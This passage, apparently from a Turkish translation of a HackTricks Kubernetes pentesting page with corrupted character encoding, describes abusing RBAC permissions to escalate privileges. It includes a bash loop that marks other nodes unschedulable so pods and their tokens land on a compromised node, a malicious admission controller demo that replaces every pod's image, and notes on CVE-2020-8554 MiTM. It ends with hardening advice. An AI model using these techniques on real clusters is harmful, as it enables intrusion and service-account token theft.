`validatingwebhookconfigurations` veya `mutatingwebhookconfigurations` Ã¼zerinde `oluÅŸturma`, `gÃ¼ncelleme` veya `yama` fiillerine sahip prensipler, ayrÄ±calÄ±klarÄ± **yÃ¼kseltmek** iÃ§in bir webhook yapÄ±landÄ±rmasÄ±ndan birini **oluÅŸturabilir**.

[`mutatingwebhookconfigurations` Ã¶rneÄŸi iÃ§in bu bÃ¶lÃ¼me bakÄ±n](./#malicious-admission-controller).

### YÃ¼kseltme

Åu bÃ¶lÃ¼mde okuyabileceÄŸiniz gibi: [**Dahili AyrÄ±calÄ±klÄ± YÃ¼kseltme Ã–nleme**](./#built-in-privileged-escalation-prevention), bir prensip, kendisinde olmayan yeni izinlere sahip olmadan rolleri veya clusterrolleri gÃ¼ncelleyemez veya oluÅŸturamaz. Ancak **`roller`** veya **`clusterroller`** Ã¼zerinde **`yÃ¼kselt`** fiiline sahipse, yeni rolleri, clusterrolleri kendisindeki izinlerden daha iyi izinlerle oluÅŸturabilir veya gÃ¼ncelleÅŸtirebilir.

### DÃ¼ÄŸÃ¼mler proxy

**`nodes/proxy`** alt kaynaÄŸÄ±na eriÅŸimi olan prensipler, Kubelet API'si aracÄ±lÄ±ÄŸÄ±yla podlarda **kod yÃ¼rÃ¼tebilir** (bakÄ±nÄ±z [**burasÄ±**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Bu sayfada Kubelet kimlik doÄŸrulamasÄ± hakkÄ±nda daha fazla bilgi bulabilirsiniz:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Yetkili bir ÅŸekilde Kubelet API'sine konuÅŸarak [**RCE almak iÃ§in bir Ã¶rnek burada**](../pentesting-kubernetes-services/#kubelet-rce). 

### PodlarÄ± silme + planlanamayan dÃ¼ÄŸÃ¼mler

PodlarÄ± **silebilen** (`pods` kaynaÄŸÄ± Ã¼zerinde `silme` fiili), podlarÄ± **boÅŸaltabilen** (`pods/eviction` kaynaÄŸÄ± Ã¼zerinde `oluÅŸturma` fiili) veya **pod durumunu deÄŸiÅŸtirebilen** ( `pods/status` eriÅŸimi) ve **diÄŸer dÃ¼ÄŸÃ¼mleri planlanamaz hale getirebilen** ( `nodes/status` eriÅŸimi) veya **dÃ¼ÄŸÃ¼mleri silebilen** (`nodes` kaynaÄŸÄ± Ã¼zerinde `silme` fiili) ve bir pod Ã¼zerinde kontrolÃ¼ olan prensipler, podlarÄ± **baÅŸka dÃ¼ÄŸÃ¼mlerden Ã§alabilir** bÃ¶ylece bunlar **kompromize edilmiÅŸ dÃ¼ÄŸÃ¼mde** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve saldÄ±rgan bu podlardan **belirteÃ§leri Ã§alabilir**.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Hizmet durumu (CVE-2020-8554)

**`services/status`**'Ä± **deÄŸiÅŸtirebilen** yetkililer, `status.loadBalancer.ingress.ip` alanÄ±nÄ± ayarlayarak **dÃ¼zeltilmemiÅŸ CVE-2020-8554**'Ã¼ istismar edebilir ve **clus**ter'a karÅŸÄ± **MiTM saldÄ±rÄ±larÄ± baÅŸlatabilir**. CVE-2020-8554 iÃ§in Ã§oÄŸu Ã¶nlem, yalnÄ±zca ExternalIP hizmetlerini engeller ([**bu**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) baÄŸlantÄ±ya gÃ¶re).

### DÃ¼ÄŸÃ¼mler ve Pod'larÄ±n durumu

`nodes/status` veya `pods/status` Ã¼zerinde **`gÃ¼ncelleme`** veya **`yama`** izinlerine sahip olan yetkililer, zamanlama kÄ±sÄ±tlamalarÄ±nÄ± etkilemek iÃ§in etiketleri deÄŸiÅŸtirebilir.

## YerleÅŸik AyrÄ±calÄ±k YÃ¼kseltme Ã–nleme

Kubernetes'in [yerleÅŸik bir mekanizmasÄ±](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ayrÄ±calÄ±k yÃ¼kseltmeyi Ã¶nler.

Bu sistem, **kullanÄ±cÄ±larÄ±n rolleri veya rol baÄŸlantÄ±larÄ±nÄ± deÄŸiÅŸtirerek ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltememesini saÄŸlar**. Bu kuralÄ±n uygulanmasÄ± API seviyesinde gerÃ§ekleÅŸir ve RBAC yetkilendiricisi etkisiz olsa bile bir koruma saÄŸlar.

Kural, bir **kullanÄ±cÄ±nÄ±n yalnÄ±zca bir rol oluÅŸturabileceÄŸini veya gÃ¼ncelleme yapabileceÄŸini belirtirken, rolÃ¼n iÃ§erdiÄŸi tÃ¼m izinlere sahip olmasÄ± gerektiÄŸini** belirtir. DahasÄ±, kullanÄ±cÄ±nÄ±n mevcut izinlerinin kapsamÄ±, oluÅŸturmayÄ± veya deÄŸiÅŸtirmeyi denediÄŸi rolÃ¼n kapsamÄ±yla uyumlu olmalÄ±dÄ±r: ya ClusterRoles iÃ§in kÃ¼me genelinde ya da Roller iÃ§in aynÄ± ad alanÄ±na (veya kÃ¼me genelinde) sÄ±nÄ±rlÄ± olmalÄ±dÄ±r.

{% hint style="warning" %}
Ã–nceki kurala bir istisna vardÄ±r. EÄŸer bir yetkili **`yÃ¼kselt`** fiiline sahipse **`roller`** veya **`clusterroller`** Ã¼zerinde, rollerin ve clusterrollerin ayrÄ±calÄ±klarÄ±nÄ± artÄ±rabilir, hatta kendisinde izin olmasa bile.
{% endhint %}

### **RolBaÄŸlantÄ±larÄ±/ClusterRoleBaÄŸlantÄ±larÄ± Al & Yama**

{% hint style="danger" %}
**GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bu teknik Ã¶nceden iÅŸe yarÄ±yordu, ancak testlerime gÃ¶re artÄ±k Ã¶nceki bÃ¶lÃ¼mde aÃ§Ä±klanan aynÄ± nedenle Ã§alÄ±ÅŸmÄ±yor. Kendinize veya farklÄ± bir SA'ya bazÄ± ayrÄ±calÄ±klar vermek iÃ§in bir rol baÄŸlantÄ±sÄ± oluÅŸturamazsÄ±nÄ±z/deÄŸiÅŸtiremezsiniz, eÄŸer zaten izniniz yoksa.**
{% endhint %}

RolBaÄŸlantÄ±larÄ± oluÅŸturma ayrÄ±calÄ±ÄŸÄ±, bir kullanÄ±cÄ±nÄ±n **rolleri bir hizmet hesabÄ±na baÄŸlamasÄ±na** olanak tanÄ±r. Bu ayrÄ±calÄ±k, **kullanÄ±cÄ±nÄ±n bir tehlikeli hizmet hesabÄ±na yÃ¶netici ayrÄ±calÄ±klarÄ±nÄ± baÄŸlamasÄ±na izin verdiÄŸi iÃ§in ayrÄ±calÄ±k yÃ¼kseltmeye yol aÃ§abilir.**

## DiÄŸer SaldÄ±rÄ±lar

### Yan araÃ§ proxy uygulamasÄ±

VarsayÄ±lan olarak, pod'lar arasÄ±ndaki iletiÅŸimde ÅŸifreleme yoktur. KarÅŸÄ±lÄ±klÄ± kimlik doÄŸrulama, iki yÃ¶nlÃ¼, poddan poda.

#### Yan araÃ§ proxy uygulamasÄ± oluÅŸturma <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

.yaml dosyanÄ±zÄ± oluÅŸturun
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Yaml dosyanÄ±zÄ± dÃ¼zenleyin ve yorum satÄ±rlarÄ±nÄ± ekleyin:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Proxy'nin gÃ¼nlÃ¼klerini gÃ¶rÃ¼ntÃ¼leyin:
```bash
kubectl logs app -C proxy
```
Daha fazla bilgi iÃ§in: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### KÃ¶tÃ¼ Niyetli Kabul Denetleyicisi

Bir kabul denetleyicisi, nesnenin kalÄ±cÄ±lÄ±ÄŸÄ±na geÃ§meden Ã¶nce Kubernetes API sunucusuna yapÄ±lan istekleri **onaylanmÄ±ÅŸ ve yetkilendirilmiÅŸ** olduktan sonra **engeller**.

Bir saldÄ±rgan, bir Mutasyon Kabul Denetleyicisi **enjekte etmeyi baÅŸarÄ±rsa**, zaten doÄŸrulanmÄ±ÅŸ istekleri **deÄŸiÅŸtirebilir**. Bu, potansiyel olarak ayrÄ±calÄ±k yÃ¼kseltme ve daha yaygÄ±n olarak kÃ¼mede kalÄ±cÄ±lÄ±k saÄŸlama yeteneÄŸi sunar.

**Ã–rnek** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Durumunu kontrol etmek iÃ§in hazÄ±r mÄ±:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Sonra yeni bir pod daÄŸÄ±t:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
EÄŸer `ErrImagePull` hatasÄ±nÄ± gÃ¶rÃ¼yorsanÄ±z, gÃ¶rÃ¼ntÃ¼ adÄ±nÄ± aÅŸaÄŸÄ±daki sorgulardan biriyle kontrol edin:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

YukarÄ±daki gÃ¶rÃ¼ntÃ¼de gÃ¶rebileceÄŸiniz gibi, `nginx` imajÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmayÄ± denedik ancak sonunda yÃ¼rÃ¼tÃ¼len imaj `rewanthtammana/malicious-image` oldu. Åimdi ne oldu!!?

#### Teknik Detaylar <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` betiÄŸi, istekleri deÄŸiÅŸtiren bir webhook admission controller oluÅŸturur ve yapÄ±landÄ±rma satÄ±rlarÄ±nda belirtildiÄŸi gibi Kubernetes API'sine gelen istekleri deÄŸiÅŸtirerek gÃ¶zlemlenen sonuÃ§larÄ± etkiler:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
YukarÄ±daki parÃ§a, her poddaki ilk konteyner gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ `rewanthtammana/malicious-image` ile deÄŸiÅŸtirir.

## OPA Gatekeeper atlatma

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## En Ä°yi Uygulamalar

### **Servis HesabÄ± Token'larÄ±nÄ±n Otomatik BaÄŸlanmasÄ±nÄ±n Devre DÄ±ÅŸÄ± BÄ±rakÄ±lmasÄ±**

* **Podlar ve Servis HesaplarÄ±**: VarsayÄ±lan olarak, podlar bir servis hesabÄ± token'Ä± baÄŸlar. GÃ¼venliÄŸi artÄ±rmak iÃ§in, Kubernetes bu otomatik baÄŸlanma Ã¶zelliÄŸinin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ±na izin verir.
* **NasÄ±l UygulanÄ±r**: Kubernetes sÃ¼rÃ¼mÃ¼ 1.6'dan baÅŸlayarak, servis hesaplarÄ± veya podlarÄ±n yapÄ±landÄ±rmasÄ±nda `automountServiceAccountToken: false` olarak ayarlayÄ±n.

### **RoleBindings/ClusterRoleBindings'de KÄ±sÄ±tlayÄ±cÄ± KullanÄ±cÄ± AtamasÄ±**

* **SeÃ§ici Dahil Etme**: RoleBindings veya ClusterRoleBindings'e yalnÄ±zca gerekli kullanÄ±cÄ±larÄ±n dahil edildiÄŸinden emin olun. SÄ±k â€‹â€‹sÄ±k denetleyin ve gereksiz kullanÄ±cÄ±larÄ± kaldÄ±rarak sÄ±kÄ± gÃ¼venliÄŸi koruyun.

### **Namespace-Specific Rollerin Cluster-Wide Rollere Tercihi**

* **Roller vs. ClusterRoller**: Cluster-wide uygulanan ClusterRoles ve ClusterRoleBindings yerine, namespace'e Ã¶zgÃ¼ izinler iÃ§in Roller ve RoleBindings kullanmayÄ± tercih edin. Bu yaklaÅŸÄ±m daha ince kontrol saÄŸlar ve izinlerin kapsamÄ±nÄ± sÄ±nÄ±rlar.

### **Otomatik araÃ§lar kullanÄ±n**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Referanslar**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** beni **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek destek olun.**

</details>
